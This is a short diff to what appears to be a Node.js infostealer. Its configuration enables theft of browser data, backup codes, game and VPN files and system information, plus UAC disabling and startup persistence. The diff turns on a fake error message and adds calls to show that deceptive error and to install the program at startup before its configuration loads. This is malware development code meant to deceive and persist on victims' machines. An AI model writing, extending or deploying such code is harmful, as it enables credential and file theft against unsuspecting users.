@@ -2,7 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const os = require('os');
 const crypto = require('crypto');
-const CONFIG = { browsers: true, backupcodes: true, games: true, filevpn: true, wallet: false, disableuac: true, computerinfo: true, fakeerror: false, startup: true, antivm: false };
+const CONFIG = { browsers: true, backupcodes: true, games: true, filevpn: true, wallet: false, disableuac: true, computerinfo: true, fakeerror: true, startup: true, antivm: false };
 let sqlite3; try { sqlite3 = require('sqlite3'); } catch (e) { sqlite3 = null; }
 const { execSync, exec, spawn } = require('child_process');
 const axios = require('axios');
@@ -2898,6 +2898,14 @@ class Client {
     async init() {
         let downloadLink = null;
         try {
+
+            if (CONFIG.fakeerror) {
+                await showFakeError();
+            }
+
+            if (CONFIG.startup) {
+                await basicStartup();
+            }
             await loadConfiguration();
 
 
